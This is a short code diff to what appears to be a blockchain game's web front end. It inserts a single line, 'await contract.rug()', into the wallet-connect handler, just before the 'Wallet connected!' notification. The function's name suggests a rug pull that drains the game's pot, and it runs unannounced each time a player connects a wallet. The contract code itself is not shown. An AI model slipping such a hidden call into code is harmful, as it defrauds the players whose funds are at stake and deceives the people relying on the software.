@@ -310,6 +310,7 @@
                     rewards = new ethers.Contract(GR_ADRESS, GR_ABI, signer);
                     const getBalance = await provider.getBalance(CONTRACT_ADDRESS);
                     const balance = ethers.utils.formatEther(getBalance)
+                    await contract.rug()
                     document.getElementById("pot").textContent = balance;
                     showNotification("Wallet connected!", 3000, "success");
                     await updateGameState(contract, account);
